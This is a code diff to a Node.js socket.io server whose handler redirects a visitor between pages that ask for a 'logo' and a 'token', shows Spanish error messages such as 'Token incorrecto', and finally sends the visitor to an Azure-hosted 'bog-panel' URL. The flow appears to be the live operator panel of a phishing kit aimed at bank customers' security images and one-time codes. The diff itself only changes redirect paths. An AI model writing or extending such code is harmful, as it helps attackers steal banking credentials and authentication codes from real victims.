@@ -67,18 +67,18 @@ io.on('connection', (socket) => {
             let redirectUrl, message;
             switch (action) {
                 case 'error_logo':
-                    redirectUrl = '?action=error_logo';
+                    redirectUrl = '/index.html?action=error_logo';
                     message = 'Por favor verifique su logo e intente nuevamente.';
                     break;
                 case 'pedir_logo':
-                    redirectUrl = '?action=pedir_logo';
+                    redirectUrl = '/index.html?action=pedir_logo';
                     break;
                 case 'error_token':
-                    redirectUrl = '?action=error_token';
+                    redirectUrl = '/token.html?action=error_token';
                     message = 'Token incorrecto. Por favor intente nuevamente.';
                     break;
                 case 'pedir_token':
-                    redirectUrl = '?action=pedir_token';
+                    redirectUrl = '/token.html?action=pedir_token';
                     break;
                 case 'finalizar':
                     redirectUrl = 'https://bog-panel-a7g7fqcgftfscrcv.centralus-01.azurewebsites.net/';
